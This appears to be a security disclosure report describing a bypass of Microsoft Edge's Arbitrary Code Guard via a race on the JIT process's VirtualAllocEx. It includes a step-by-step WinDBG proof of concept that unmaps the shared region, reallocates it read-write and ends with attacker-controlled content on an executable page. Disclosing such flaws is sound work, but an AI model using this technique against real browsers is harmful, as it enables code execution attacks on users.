Background:

To implement ACG (https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/#VM4y5oTSGCRde3sk.97), Edge uses a separate process for JIT compiling. This JIT Process is also responsible for mapping native code into the requesting Content Process.

In order to be able to write JITted (executable) data into the Content Process, JIT Process does the following:

1. It creates a shared memory object using CreateFileMapping()
2. It maps it into Content Process as PAGE_EXECUTE_READ and in the JIT proces as PAGE_READWRITE using MapViewOfFile2(). At this point the memory is reserved, but not yet committed.
3. When individual pages need to be written to they are first allocated from the region in step 2 using VirtualAllocEx(). This also marks the memory as committed.

The issue:

If a content process is compromised and the content process can predict on which address JIT process is going to call VirtualAllocEx() next (note: it is fairly predictable), content process can:

1. Unmap the shared memory mapped above above using UnmapViewOfFile()
2. Allocate a writable memory region on the same address JIT server is going to write and write an soon-to-be-executable payload there.
3. When JIT process calls VirtualAllocEx(), even though the memory is already allocated, the call is going to succeed and the memory protection is going to be set to PAGE_EXECUTE_READ.

Note #1: The content written in step 2 is going to survive the memory protection change.
Note #2: JIT server is going to write the JITted payload into its own "side" of the shared memory, so the content in the Content Process is not going to get immediately overwritten.

See the debug log below for a demonstration.

Debug log:

Let's attach one instance of WinDBG to JIT process and another to a Content Process.

Let's also verify that ACG is indeed applied for the Content Process. We can do this using Get-ProcessMitigation PowerShell command. See the output in the screenshot (note the "BlockDynamicCode: ON" field).

Now, in JIT Process, let's set a breakpoint on VirtualAllocEx() and wait.

0:020> bp kernelbase!virtualallocex
0:020> g

Soon the breakpoint is hit.

Breakpoint 0 hit
KERNELBASE!VirtualAllocEx:
00007fff`5590e170 4883ec38        sub     rsp,38h

We can examine the call stack to see where we are - we see we are in the Encode phase of ServerRemoteCodeGen() which is a function that Content Process calls on the JIT server when it wants to JIT a function or a loop body.

If we examine the registers we see the second param is 000002854f18c000 - this is the address VirtualAllocEx() is attempting to allocate.

Let's leave the JIT Process alone for a while and move into the Content Process. Let's examine the memory around address 000002854f18c000 using !vadump:

BaseAddress:       000002854f100000
RegionSize:        0000000000017000
State:             00001000  MEM_COMMIT

RegionSize:        0000000000004000
State:             00002000  MEM_RESERVE
Type:              00040000  MEM_MAPPED

BaseAddress:       000002854f190000
RegionSize:        0000000000010000
State:             00001000  MEM_COMMIT
Protect:           00000010  PAGE_EXECUTE
Type:              00040000  MEM_MAPPED

We see some executable memory regions starting from 000002854f100000 which happens to be the base address of the shared memory in the Content Process. Let's unmap it.

0:084> r rip=kernelbase!unmapviewoffile
0:084> r rcx=000002854f100000

After unmapping it, let's allocate the desired address and set it to PAGE_READWRITE so that we can write to it.

0:084> r rip=kernelbase!virtualalloc
0:084> r rcx=000002854f18c000 # desired address
0:084> r rdx=1000 # size
0:084> r r8=3000 # MEM_RESERVE | MEM_COMMIT
0:084> r r9=4 # PAGE_READWRITE

After VirtualAlloc() finishes, we can see it returned 000002854f180000

0:084> r rax
rax=000002854f180000

The returned address is a bit lower than the one we requested, but it doesn't matter since the allocated region is also going to be larger than we requested so it's going to cover the desired address. Let's take a look at the memory map again:

BaseAddress:       000002854f100000
RegionSize:        0000000000080000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS

BaseAddress:       000002854f180000
RegionSize:        000000000000d000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE

BaseAddress:       000002854f18d000
RegionSize:        000000000ff73000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS

We can see that at address 000002854f180000 there is a region of size 000000000000d000 that has PAGE_READWRITE access. Since we can now write to this address, let's do it:

0:084> ea 000002854f18c000 "ACG bypass"

Now, let's go back to the JIT Server process and let VirtualAllocEx() finish. Once it does, let's go back into the Content Process and examine the memory again:

BaseAddress:       000002854f100000
RegionSize:        0000000000080000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS

BaseAddress:       000002854f180000
RegionSize:        000000000000c000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE

BaseAddress:       000002854f18c000
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000010  PAGE_EXECUTE
Type:              00020000  MEM_PRIVATE

BaseAddress:       000002854f18d000
RegionSize:        000000000ff73000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS

We can now see some changes, specifically at address 000002854f18c000 there is now an executable memory region (PAGE_EXECUTE). Now we just need to make sure the content we wrote earlier is still there.

0:084> da 000002854f18c000
00000285`4f18c000  "ACG bypass"

That's it. We now have an executable page with the content we control, thus bypassing ACG.

A screenshot of WinDBG showing this final step is attached.
